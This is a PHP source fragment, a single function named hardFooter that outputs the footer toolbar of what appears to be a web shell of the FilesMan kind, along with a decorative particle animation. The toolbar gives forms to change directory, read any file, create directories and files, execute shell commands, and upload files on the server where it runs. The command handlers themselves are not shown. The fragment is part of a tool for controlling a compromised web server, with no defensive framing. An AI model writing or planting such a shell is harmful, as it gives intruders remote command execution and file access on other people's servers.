<?php

function hardFooter()
{
    $is_writable = is_writable($GLOBALS["cwd"]) ? " <font color='#FFDB5F'>[ Writeable ]</font>" : " <font color=red>(Not writable)</font>";
    echo "\n</div>\n<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>\n\t<tr>\n\t\t<td><form onsubmit=\"" . (function_exists("actionFilesMan") ? "g(null,this.c.value,'');" : '') . "return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS["cwd"]) . "'><input type=submit value='submit'></form></td>\n\t\t<td><form onsubmit=\"" . (function_exists("actionFilesTools") ? "g('FilesTools',null,this.f.value);" : '') . "return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>\n\t</tr><tr>\n\t\t<td><form onsubmit=\"" . (function_exists("actionFilesMan") ? "g('FilesMan',null,'mkdir',this.d.value);" : '') . "return false;\"><span>Make dir:</span>{$is_writable}<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>\n\t\t<td><form onsubmit=\"" . (function_exists("actionFilesTools") ? "g('FilesTools',null,this.f.value,'mkfile');" : '') . "return false;\"><span>Make file:</span>{$is_writable}<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>\n\t</tr><tr>\n\t\t<td><form onsubmit=\"" . (function_exists("actionConsole") ? "g('Console',null,this.c.value);" : '') . "return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>\n\t\t<td><form method='post' " . (!function_exists("actionFilesMan") ? " onsubmit=\"return false;\" " : '') . "ENCTYPE='multipart/form-data'>\n\t\t<input type=hidden name=a value='FilesMan'>\n\t\t<input type=hidden name=c value='" . htmlspecialchars($GLOBALS["cwd"]) . "'>\n\t\t<input type=hidden name=p1 value='uploadFile'>\n\t\t<input type=hidden name=ne value=''>\n\t\t<input type=hidden name=charset value='" . (isset($_POST["charset"]) ? $_POST["charset"] : '') . "'>\n\t\t<span>Upload file:</span>{$is_writable}<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>\n\t</tr></table></div>\n\t<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>\n\t<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>\n\t</body></html>";
}
